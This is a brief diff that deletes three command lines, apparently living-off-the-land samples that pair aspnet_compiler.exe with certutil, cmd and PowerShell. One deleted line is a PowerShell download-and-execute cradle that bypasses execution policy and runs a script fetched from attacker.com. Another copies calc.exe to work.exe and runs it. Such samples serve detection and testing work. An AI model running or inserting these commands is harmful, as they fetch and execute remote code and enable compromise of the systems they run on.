@@ -1,3 +1,0 @@
-aspnet_compiler.exe -v / certutil.exe
-aspnet_compiler.exe -v / cmd.exe /c "copy calc.exe work.exe && work.exe"
-aspnet_compiler.exe -v / powershell.exe -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
